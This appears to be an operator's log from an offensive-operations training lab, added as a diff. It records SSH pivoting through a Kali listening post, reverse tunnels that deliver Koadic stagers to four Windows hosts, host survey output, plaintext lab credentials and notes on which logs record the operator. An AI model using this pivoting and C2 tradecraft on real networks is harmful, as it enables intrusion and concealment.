@@ -1,0 +1,197 @@
+Date:2024-05-15 
+Start time: 0900
+End time: 1500
+
+------------------------
+SOM
+------------------------
+ LP: 10.50.35.15
+->T1: 10.50.31.171
+--<T2: 10.180.169.17
+--<T3: 10.180.169.16
+--<T4: 10.180.169.9
+--<T5: 10.180.169.20
+------------------------
+Creds
+------------------------
+student14::password14
+NOC_admin14::7XBPRzyKsUWBeI3puA
+
+Koadic Stager
+T2 RHP = 14229 – Endpoint = may
+T3 RHP = 14228 – Endpoint = theforce
+T4 RHP = 14227 – Endpoint = bewith
+T5 RHP = 14226 – Endpoint = you
+=========================
+LP: 10.50.35.15
+=========================
+X-----------------------
+2024-05-15 09:02:12-- connection to LP; start vetting
+ssh -MS /tmp/LP -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.35.15
+password14
+
+fa:16:3e:d8:03:54
+10.50.35.15
+2024-05-15 09:04:53-- date
+Wed May 15 13:04:49 UTC 2024
+Wed May 15 13:04:49 UTC 2024
+Linux kali 6.6.15-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-2kali1 (2024-04-09) x86_64 GNU/Linux
+ssh -M -S /tmp/KOA_EXT_RTR NOC_admin23@10.50.31.171 -R 10.180.169.253:23229:0.0.0.0:23229 -R 10.180.169.2
+root     - ttyS0        2024-05-14 16:38 20:25         733
+root     - tty1         2024-05-14 16:40 20:20         861
+
+2024-05-15 09:16:59-- vetting complete; redirecting
+
+
+ssh -MS /tmp/T1.14 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_admin14@127.0.0.1 -p 14111
+2024-05-15 14:12:01-- start exit vetting
+2024-05-15 14:13:31-- exit vetting complete; disconnect from LP
+
+Logged In: utmp, wtmp, lastlog, secure, auth.log, syslog
+------------------------X
+=========================
+
+=========================
+->T1: 10.50.31.171 
+=========================
+X-----------------------
+2024-05-15 09:19:18-- connection to T1; start vetting
+ssh -S /tmp/LP -O forward -L 127.0.0.1:2001:10.50.31.171:22 dummy
+ssh -MS /tmp/T1.14 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_admin14@10.50.31.171
+7XBPRzyKsUWBeI3puA
+
+eth0:
+fa:16:3e:8f:bf:d4
+10.50.31.171
+eth1:
+fa:16:3e:e7:62:2e
+10.180.169.253
+2024-05-15 09:21:54-- date
+Wed May 15 13:21:46 UTC 2024
+Wed May 15 13:21:46 UTC 2024
+Linux koa-ext-rtr.novalocal 4.18.0-519.el8.x86_64 #1 SMP Tue Oct 24 16:44:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+-rw-rw-r--.  1 root   utmp     8448 May 15 13:19 wtmp
+-rw-rw-r--.  1 root   utmp   299008 May 15 13:19 lastlog
+-rw-------.  1 root   root   140650 May 15 13:23 messages
+-rw-------.  1 root   root    15549 May 15 13:24 secure
+/var/log/audit/audit.log
+*.* @@10.50.22.142:514
+SELinux status:                 enabled
+Current mode:                   enforcing
+root     tty1     -                Tue16   20:36m  0.01s  0.01s -bash
+
+2024-05-15 09:43:02-- vetting complete; setup tunnels
+
+2024-05-15 14:08:47-- start exit vetting
+2024-05-15 14:11:24-- exit vetting complete; disconnect from T1
+
+Logged In: audit.log, wtmp, utmp, secure, messages, rsyslog, lastlog
+------------------------X
+=========================
+
+=========================
+--<T2: 10.180.169.17
+=========================
+X-----------------------
+
+ssh -S /tmp/T1.14 dummy -O forward -R 10.180.169.17:14229:127.0.0.1:14229
+ssh -S /tmp/LP dummy
+T2 RHP = 14229 – Endpoint = may
+SRVHOST 10.180.169.253
+2024-05-15 10:45:21-- added T2 to zombies
+2024-05-15 10:48:18-- connection to T2; start vetting
+cmdshell 0
+
+FA-16-3E-31-FE-6A
+10.180.169.17
+2024-05-15 10:50:13-- date
+Wed 05/15/2024 
+02:49 PM
+>administrator         console             1  Active      none   5/14/2024 5:02 PM
+
+2024-05-15 11:18:25-- vetting complete; start survey
+2024-05-15 11:28:01-- survey complete; start exit vetting
+2024-05-15 11:30:55-- exit vetting complete; disconnect from T2
+kill 0
+
+Logged In: Security, Application
+------------------------X
+=========================
+
+=========================
+--<T3: 10.180.169.16
+=========================
+X-----------------------
+2024-05-15 11:38:00-- connection to T3; start vetting
+ssh -S /tmp/T1.14 dummy -O forward -R 10.180.169.16:14228:127.0.0.1:14228
+T3 RHP = 14228 – Endpoint = theforce
+10.180.169.253
+
+FA-16-3E-2C-85-80
+10.180.169.16
+2024-05-15 11:39:19-- date
+Wed 05/15/2024 
+03:39 PM
+>administrator         console             1  Active      none   5/14/2024 1:37 PM
+explorer.exe     4592 Console                    1    100,696 K Running         DESKTOP-4BH6HKQ\Administrator                           0:00:10 N/A      WinStore.App.exe
+C:\Program Files\WindowsApps\Microsoft.WindowsStore_11712.1001.23.0_x64__8wekyb3d8bbwe\WinStore.App.exe           800              7216       
+CP    10.180.169.16:49736    23.36.68.189:443       CLOSE_WAIT      7216
+ [WinStore.App.exe]
+  TCP    10.180.169.16:49737    192.229.211.108:80     CLOSE_WAIT      7216
+ [WinStore.App.exe]
+
+2024-05-15 13:15:48-- vetting complete; start survey
+2024-05-15 13:21:28-- survey complete; start exit vetting
+2024-05-15 13:24:34-- exit vetting complete; disconnect from T3
+
+Logged In: Security
+------------------------X
+=========================
+
+=========================
+--<T4: 10.180.169.9
+=========================
+X-----------------------
+2024-05-15 13:31:11-- connection to T4; start vetting
+ssh -S /tmp/T1.14 dummy -O forward -R 10.180.169.9:14227:127.0.0.1:14227
+T4 RHP = 14227 – Endpoint = bewith
+SRVHOST 10.180.169.253
+
+FA-16-3E-8F-64-99
+10.180.169.9
+2024-05-15 13:32:39-- date
+Wed 05/15/2024 
+05:32 PM
+>administrator         console             1  Active      none   5/14/2024 5:04 PM
+2024-05-15 13:41:56-- vetting complete; start survey
+2024-05-15 13:45:06-- survey complete; start exit vetting
+2024-05-15 13:46:22-- exit vetting complete; disconnect from T4
+
+Logged In: Security, Application
+-----------------------X
+=========================
+
+=========================
+--<T5: 10.180.169.20 
+=========================
+X-----------------------
+2024-05-15 13:51:18-- connection to T5; start vetting
+ssh -S /tmp/T1.14 dummy -O forward -R 10.180.169.20:14226:127.0.0.1:14226
+T5 RHP = 14226 – Endpoint = you
+SRVHOST 10.180.169.253
+
+FA-16-3E-44-EE-A7
+10.180.169.20
+2024-05-15 13:52:32-- date
+Wed 05/15/2024 
+05:52 PM
+>administrator         console             1  Active      none   5/14/2024 1:37 PM
+
+2024-05-15 14:03:04-- vetting complete; start survey
+2024-05-15 14:05:54-- survey complete; start exit vetting
+2024-05-15 14:08:07-- exit vetting complete; disconnect from T5
+
+Logged In: Security
+-----------------------X
+=========================
